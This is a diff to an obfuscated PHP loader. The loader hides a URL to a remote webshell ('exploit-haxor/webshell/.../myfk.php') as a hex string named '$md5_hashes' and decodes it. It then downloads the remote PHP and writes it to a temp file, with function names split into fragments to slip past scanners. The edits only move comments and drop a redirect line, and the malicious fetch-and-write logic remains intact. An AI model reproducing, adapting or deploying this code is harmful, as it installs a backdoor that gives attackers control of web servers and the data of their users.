@@ -1,7 +1,5 @@
 <?php
-// password : bar ki not
-$md5_hashes = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f6d79666b2e706870';
-// password : bar ki not
+$md5_hashes = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f6d79666b2e706870'; // password : bar ki not
 function hex2str($hex) {
     $str = '';
     for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
@@ -10,7 +8,7 @@ function hex2str($hex) {
     return $str;
 }
 
-$url = hex2str($md5_hashes); # Jangan Edit bangian sini kalo tidak mau error
+$url = hex2str($md5_hashes);
 
 function downloadWithFileGetContents($url) {
     if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
@@ -70,7 +68,7 @@ function M() {
 		fwrite($HANDLE, $FGT);
 		fclose($HANDLE);
 	}
-	echo '<script>window.location="?hari";</script>';
+
 }
 
 if(file_exists($TMP)) {
